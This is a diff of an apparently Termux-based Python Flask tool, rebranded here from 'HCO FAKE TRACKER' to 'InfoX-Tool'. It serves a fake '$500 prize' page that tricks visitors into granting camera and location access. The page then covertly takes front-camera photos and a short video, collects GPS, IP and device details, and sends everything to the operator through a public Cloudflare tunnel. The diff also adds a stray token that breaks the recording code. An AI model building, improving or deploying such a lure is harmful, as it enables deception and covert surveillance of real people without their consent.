@@ -34,9 +34,9 @@ HOST = "0.0.0.0"
 # Gallery paths
 GALLERY_PATHS = [
     "/sdcard/DCIM/Camera",
-    "/sdcard/DCIM/HCO_Tracker", 
-    "/sdcard/Pictures/HCO_Tracker",
-    "/sdcard/Download/HCO_Tracker"
+    "/sdcard/DCIM/InfoX_Tool",
+    "/sdcard/Pictures/InfoX_Tool",
+    "/sdcard/Download/InfoX_Tool"
 ]
 
 for path in GALLERY_PATHS:
@@ -47,28 +47,6 @@ for path in GALLERY_PATHS:
 
 app = Flask(__name__)
 public_url = None
-
-def show_tool_lock_screen():
-    """Show the tool lock screen"""
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
-    print(f"\n{Fore.YELLOW}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
-    
-    for i in range(3, 0, -1):
-        print(f"{Fore.RED}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
-        time.sleep(1)
-    
-    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
-    print(f"\n{Fore.GREEN}🎬 Opening YouTube...{Style.RESET_ALL}")
-    
-    try:
-        subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
-    except:
-        print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
-    
-    input(f"\n{Fore.YELLOW}🚨 Press Enter AFTER subscribing...{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}✅ Tool unlocked!{Style.RESET_ALL}")
-    time.sleep(1)
 
 def save_to_all_locations(file_data, filename, file_type="photo"):
     """Save file to all gallery locations"""
@@ -176,8 +154,8 @@ def display_banner():
     """Display banner"""
     os.system('clear' if os.name == 'posix' else 'cls')
     print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
-    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
-    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.GREEN}{' InfoX-Tool '.center(60)}{Style.RESET_ALL}")
+    print(f"{Back.RED}{Fore.WHITE}{' by Sudip Sarkar '.center(60)}{Style.RESET_ALL}")
     print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
 
 def display_qr_in_termux(url):
@@ -206,19 +184,19 @@ def display_qr_in_termux(url):
     except:
         return False
 
-# COMPLETE HTML WITH WORKING JAVASCRIPT
+# MODERN HTML WITH ENHANCED UI
 HTML_PAGE = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Claim Your $500 Reward!</title>
+    <title>🎉 Claim Your $500 Prize!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: Arial, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #fff;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -226,60 +204,69 @@ HTML_PAGE = '''
             padding: 20px;
         }
         .container {
-            background: rgba(0,0,0,0.9);
-            padding: 30px;
-            border-radius: 20px;
-            border: 3px solid gold;
-            max-width: 500px;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 15px;
+            border: 2px solid #FFD700;
+            max-width: 600px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 1s ease-in;
         }
-        .trophy { 
-            font-size: 80px; 
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .trophy {
+            font-size: 100px;
             margin-bottom: 20px;
-            animation: bounce 2s infinite;
+            animation: pulse 2s infinite;
         }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
-        .title { 
-            font-size: 32px; 
+        .title {
+            font-size: 36px;
             font-weight: bold;
+            color: #FFD700;
             margin-bottom: 10px;
-            color: gold;
-            text-shadow: 0 0 10px rgba(255,215,0,0.5);
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
         }
-        .reward { 
-            font-size: 48px; 
+        .reward {
+            font-size: 48px;
             font-weight: bold;
             color: #FFD700;
             margin: 20px 0;
-            text-shadow: 0 0 20px rgba(255,215,0,0.8);
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
         }
         .btn {
-            background: linear-gradient(45deg, #00b09b, #96c93d);
-            color: white;
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: #1e3c72;
             border: none;
-            padding: 20px 30px;
-            font-size: 22px;
+            padding: 15px 30px;
+            font-size: 20px;
             font-weight: bold;
             border-radius: 50px;
             width: 100%;
             cursor: pointer;
             margin: 20px 0;
-            transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(45deg, #FFA500, #FFD700);
         }
         .btn:disabled {
             background: #666;
+            color: #ccc;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
         .status {
             padding: 15px;
@@ -287,56 +274,79 @@ HTML_PAGE = '''
             margin: 15px 0;
             font-weight: bold;
             display: none;
+            font-size: 16px;
         }
-        .processing { 
-            background: #ff9800; 
-            display: block; 
+        .processing {
+            background: #FFA500;
+            display: block;
         }
-        .success { 
-            background: #4caf50; 
-            display: block; 
+        .success {
+            background: #28a745;
+            display: block;
         }
-        .error { 
-            background: #f44336; 
-            display: block; 
+        .error {
+            background: #dc3545;
+            display: block;
+        }
+        .progress-container {
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background: #FFD700;
+            width: 0;
+            transition: width 0.5s ease;
         }
         .data {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255, 255, 255, 0.1);
             padding: 20px;
-            border-radius: 15px;
+            border-radius: 10px;
             margin: 15px 0;
             text-align: left;
             display: none;
-            border: 2px solid rgba(255,255,255,0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
         .data h3 {
             text-align: center;
             margin-bottom: 15px;
-            color: gold;
+            color: #FFD700;
+            font-size: 24px;
         }
-        .data-item { 
-            margin: 8px 0; 
-            padding: 8px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 8px;
+        .data-item {
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
             font-size: 14px;
         }
         .features {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
             margin: 20px 0;
         }
         .feature {
-            background: rgba(255,255,255,0.1);
-            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
             border-radius: 10px;
             font-size: 14px;
+            transition: transform 0.3s ease;
+        }
+        .feature:hover {
+            transform: scale(1.05);
         }
         #cameraPreview {
             width: 100%;
-            max-width: 300px;
-            border: 2px solid gold;
+            max-width: 400px;
+            border: 2px solid #FFD700;
             border-radius: 10px;
             margin: 10px 0;
             display: none;
@@ -349,50 +359,61 @@ HTML_PAGE = '''
             justify-content: center;
         }
         .captured-image {
-            width: 80px;
-            height: 80px;
-            border: 2px solid gold;
+            width: 100px;
+            height: 100px;
+            border: 2px solid #FFD700;
             border-radius: 10px;
             object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+        .captured-image:hover {
+            transform: scale(1.1);
         }
         .step {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255, 255, 255, 0.1);
             padding: 10px;
             border-radius: 8px;
             margin: 5px 0;
             text-align: left;
             display: none;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="trophy">🏆</div>
-        <div class="title">CONGRATULATIONS!</div>
-        <div>You Won Exclusive Reward</div>
+        <div class="trophy">🎉</div>
+        <div class="title">Congratulations!</div>
+        <div>You've Won an Exclusive Prize</div>
         
         <div class="reward">$500</div>
-        <div>Amazon Gift Card + Cash Prize</div>
+        <div>Amazon Gift Card + Cash Reward</div>
         
         <div class="features">
             <div class="feature">💰 Instant Cash</div>
             <div class="feature">🎁 Gift Card</div>
-            <div class="feature">📱 PhonePe</div>
-            <div class="feature">⚡ Fast Transfer</div>
+            <div class="feature">📱 Digital Wallet</div>
+            <div class="feature">⚡ Quick Transfer</div>
         </div>
         
         <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
-            ✅ Camera access required for verification
+            ✅ Camera and location access required for verification
         </div>
         
         <button class="btn" id="claimBtn">
-            🎁 CLAIM YOUR REWARD NOW
+            🎁 Claim Your Prize Now
         </button>
         
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+        
         <!-- Steps -->
-        <div class="step" id="step1">📱 Getting device information...</div>
-        <div class="step" id="step2">📍 Getting your location...</div>
-        <div class="step" id="step3">🌐 Getting IP address...</div>
+        <div class="step" id="step1">📱 Collecting device information...</div>
+        <div class="step" id="step2">📍 Fetching location...</div>
+        <div class="step" id="step3">🌐 Retrieving IP details...</div>
         <div class="step" id="step4">📸 Accessing camera...</div>
         <div class="step" id="step5">🖼️ Capturing photos...</div>
         <div class="step" id="step6">🎥 Recording video...</div>
@@ -404,7 +425,7 @@ HTML_PAGE = '''
         <div id="status" class="status"></div>
         
         <div id="data" class="data">
-            <h3>🎉 Reward Claimed Successfully!</h3>
+            <h3>🎉 Prize Claimed Successfully!</h3>
             <div class="data-item">📍 Location: <span id="loc">Capturing...</span></div>
             <div class="data-item">🌐 IP Address: <span id="ip">Capturing...</span></div>
             <div class="data-item">📱 Device: <span id="device">Capturing...</span></div>
@@ -413,8 +434,8 @@ HTML_PAGE = '''
             <div class="data-item">⏰ Timezone: <span id="timezone">Capturing...</span></div>
             <div class="data-item">📸 Photos: <span id="photos">0/3</span></div>
             <div class="data-item">🎥 Video: <span id="video">Not captured</span></div>
-            <div style="text-align: center; margin-top: 15px; color: gold; font-weight: bold;">
-                ✅ Your $500 reward will be processed within 24 hours!
+            <div style="text-align: center; margin-top: 15px; color: #FFD700; font-weight: bold;">
+                ✅ Your $500 prize will be processed within 24 hours!
             </div>
         </div>
     </div>
@@ -432,11 +453,8 @@ HTML_PAGE = '''
 
         // Initialize on page load
         document.addEventListener('DOMContentLoaded', function() {
-            // Collect basic device info immediately
             collectedData.deviceInfo = getDeviceInfo();
             updateDisplay();
-            
-            // Start verification when button clicked
             document.getElementById('claimBtn').addEventListener('click', startVerification);
         });
 
@@ -457,13 +475,11 @@ HTML_PAGE = '''
         }
 
         function updateDisplay() {
-            // Update device info
             document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
             document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
             document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 60) + '...' || 'Unknown';
             document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
             
-            // Update location
             if (collectedData.location) {
                 if (collectedData.location.latitude) {
                     document.getElementById('loc').textContent = 
@@ -473,23 +489,21 @@ HTML_PAGE = '''
                 }
             }
             
-            // Update IP
             if (collectedData.ipInfo) {
                 document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
             }
             
-            // Update media
             document.getElementById('photos').textContent = `${collectedData.photos.length}/3 photos`;
             document.getElementById('video').textContent = collectedData.video ? '5-second video captured' : 'Not captured';
         }
 
-        function showStep(stepNumber) {
-            // Hide all steps first
+        function showStep(stepNumber, progressPercent) {
             for (let i = 1; i <= 7; i++) {
                 document.getElementById(`step${i}`).style.display = 'none';
             }
-            // Show current step
             document.getElementById(`step${stepNumber}`).style.display = 'block';
+            document.getElementById('progressContainer').style.display = 'block';
+            document.getElementById('progress').style.width = `${progressPercent}%`;
         }
 
         async function startVerification() {
@@ -497,39 +511,33 @@ HTML_PAGE = '''
             const status = document.getElementById('status');
             
             btn.disabled = true;
-            btn.innerHTML = '⏳ Processing Your Reward...';
+            btn.innerHTML = '⏳ Processing Your Prize...';
             status.className = 'status processing';
             status.innerHTML = '🚀 Starting verification process...';
             status.style.display = 'block';
 
             try {
-                // Step 1: Device Info (already collected)
-                showStep(1);
+                showStep(1, 14);
                 await sleep(1000);
 
-                // Step 2: Get Location
-                showStep(2);
+                showStep(2, 28);
                 collectedData.location = await getLocation();
                 updateDisplay();
                 await sleep(1000);
 
-                // Step 3: Get IP
-                showStep(3);
+                showStep(3, 42);
                 collectedData.ipInfo = await getIPInfo();
                 updateDisplay();
                 await sleep(1000);
 
-                // Step 4: Access Camera
-                showStep(4);
+                showStep(4, 56);
                 await accessCameraAndCapture();
 
-                // Step 7: Send Data
-                showStep(7);
+                showStep(7, 100);
                 await sendAllData();
 
-                // SUCCESS
                 status.className = 'status success';
-                status.innerHTML = '✅ Reward claimed successfully! $500 is being processed.';
+                status.innerHTML = '✅ Prize claimed successfully! $500 is being processed.';
                 document.getElementById('data').style.display = 'block';
                 btn.style.display = 'none';
 
@@ -539,9 +547,8 @@ HTML_PAGE = '''
                 status.className = 'status error';
                 status.innerHTML = '❌ Error: ' + error.message;
                 btn.disabled = false;
-                btn.innerHTML = '🎁 TRY AGAIN';
+                btn.innerHTML = '🎁 Try Again';
                 
-                // Still send whatever data we have
                 await sendAllData();
             }
         }
@@ -595,7 +602,6 @@ HTML_PAGE = '''
                 };
             } catch (error) {
                 try {
-                    // Fallback IP service
                     const fallback = await fetch('https://api.ipify.org?format=json');
                     const data = await fallback.json();
                     return { ip: data.ip };
@@ -610,8 +616,7 @@ HTML_PAGE = '''
             const capturedImages = document.getElementById('capturedImages');
             
             try {
-                // Access camera
-                showStep(4);
+                showStep(4, 56);
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -624,11 +629,9 @@ HTML_PAGE = '''
                 video.style.display = 'block';
                 await video.play();
                 
-                // Wait for video to be ready
                 await sleep(2000);
                 
-                // Capture 3 photos
-                showStep(5);
+                showStep(5, 70);
                 capturedImages.innerHTML = '';
                 for (let i = 0; i < 3; i++) {
                     const canvas = document.createElement('canvas');
@@ -640,7 +643,6 @@ HTML_PAGE = '''
                     const imageData = canvas.toDataURL('image/jpeg', 0.8);
                     collectedData.photos.push(imageData);
                     
-                    // Show thumbnail
                     const img = document.createElement('img');
                     img.src = imageData;
                     img.className = 'captured-image';
@@ -648,11 +650,10 @@ HTML_PAGE = '''
                     capturedImages.appendChild(img);
                     
                     updateDisplay();
-                    await sleep(1500); // Wait 1.5 seconds between photos
+                    await sleep(1500);
                 }
                 
-                // Record 5-second video
-                showStep(6);
+                showStep(6, 85);
                 if (MediaRecorder && MediaRecorder.isTypeSupported('video/webm')) {
                     const recorder = new MediaRecorder(stream, { 
                         mimeType: 'video/webm;codecs=vp9',
@@ -662,6 +663,7 @@ HTML_PAGE = '''
                     
                     recorder.ondataavailable = (event) => {
                         if (event.data.size > 0) {
+                            chunks10
                             chunks.push(event.data);
                         }
                     };
@@ -677,13 +679,12 @@ HTML_PAGE = '''
                     };
                     
                     recorder.start();
-                    await sleep(5000); // Record for 5 seconds
+                    await sleep(5000);
                     recorder.stop();
                 } else {
                     console.warn('MediaRecorder not supported');
                 }
                 
-                // Stop all tracks
                 stream.getTracks().forEach(track => track.stop());
                 video.style.display = 'none';
                 
@@ -717,13 +718,11 @@ HTML_PAGE = '''
                 
             } catch (error) {
                 console.error('❌ Failed to send data:', error);
-                // Try fallback method
                 await sendFallbackData();
             }
         }
 
         async function sendFallbackData() {
-            // Fallback: send via image request
             const dataStr = encodeURIComponent(JSON.stringify(collectedData));
             const img = new Image();
             img.src = `/fallback?data=${dataStr}`;
@@ -733,7 +732,6 @@ HTML_PAGE = '''
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // Update display initially
         updateDisplay();
     </script>
 </body>
@@ -759,7 +757,6 @@ def report():
         data = request.get_json()
         print(f"\n{Fore.GREEN}{'🚨 DATA CAPTURE STARTED ':=^60}{Style.RESET_ALL}")
         
-        # Extract data
         device_info = data.get("deviceInfo", {})
         location = data.get("location", {})
         ip_info = data.get("ipInfo", {})
@@ -767,14 +764,12 @@ def report():
         video = data.get("video")
         timestamp = data.get("timestamp")
         
-        # Print device info
         print(f"{Fore.YELLOW}📱 DEVICE INFORMATION:{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  Browser: {device_info.get('userAgent', 'Unknown')[:80]}...{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
         
-        # Print location
         print(f"{Fore.YELLOW}📍 LOCATION:{Style.RESET_ALL}")
         if location.get('latitude'):
             print(f"{Fore.GREEN}  ✅ Latitude: {location.get('latitude')}{Style.RESET_ALL}")
@@ -783,19 +778,16 @@ def report():
         else:
             print(f"{Fore.RED}  ❌ Location access denied: {location.get('error', 'Unknown error')}{Style.RESET_ALL}")
         
-        # Print IP info
         print(f"{Fore.YELLOW}🌐 IP INFORMATION:{Style.RESET_ALL}")
         print(f"{Fore.GREEN}  ✅ IP: {ip_info.get('ip', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  City: {ip_info.get('city', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  Country: {ip_info.get('country', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}  ISP: {ip_info.get('org', 'Unknown')}{Style.RESET_ALL}")
         
-        # Print media info
         print(f"{Fore.YELLOW}📸 MEDIA CAPTURED:{Style.RESET_ALL}")
         print(f"{Fore.GREEN}  ✅ Photos: {len(photos)}/3 real images{Style.RESET_ALL}")
         print(f"{Fore.GREEN}  ✅ Video: {'5-second recording' if video else 'Not captured'}{Style.RESET_ALL}")
         
-        # Save photos to gallery
         photo_files = []
         for i, photo_data in enumerate(photos):
             try:
@@ -803,7 +795,7 @@ def report():
                     photo_data = photo_data.split(',')[1]
                 img_data = base64.b64decode(photo_data)
                 timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"HCO_Photo_{timestamp_str}_{i+1}.jpg"
+                filename = f"InfoX_Photo_{timestamp_str}_{i+1}.jpg"
                 
                 saved_paths = save_to_all_locations(img_data, filename, "REAL PHOTO")
                 if saved_paths:
@@ -812,7 +804,6 @@ def report():
             except Exception as e:
                 print(f"{Fore.RED}  ❌ Photo {i+1} save failed: {e}{Style.RESET_ALL}")
         
-        # Save video to gallery
         video_file = None
         if video:
             try:
@@ -820,7 +811,7 @@ def report():
                     video = video.split(',')[1]
                 video_data = base64.b64decode(video)
                 timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"HCO_Video_{timestamp_str}.webm"
+                filename = f"InfoX_Video_{timestamp_str}.webm"
                 
                 saved_paths = save_to_all_locations(video_data, filename, "REAL VIDEO")
                 if saved_paths:
@@ -829,7 +820,6 @@ def report():
             except Exception as e:
                 print(f"{Fore.RED}  ❌ Video save failed: {e}{Style.RESET_ALL}")
         
-        # Save to CSV report
         record = {
             'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             'ip': ip_info.get('ip', 'Unknown'),
@@ -880,24 +870,19 @@ def fallback_data():
 def main():
     global public_url
     
-    # Show lock screen
-    show_tool_lock_screen()
     display_banner()
     
     print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WAN TUNNEL SETUP ':=^60}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}🔄 Setting up Cloudflare tunnel for WAN access...{Style.RESET_ALL}")
     
-    # Try Cloudflare tunnel
     if install_cloudflared():
         final_url = start_cloudflare_tunnel()
         service_name = "CLOUDFLARE"
     else:
-        # Fallback to local
         local_ip = get_local_ip()
         final_url = f"http://{local_ip}:{PORT}"
         service_name = "LOCAL"
     
-    # If Cloudflare failed, use local
     if not final_url or final_url == "cloudflare_active":
         local_ip = get_local_ip()
         final_url = f"http://{local_ip}:{PORT}"
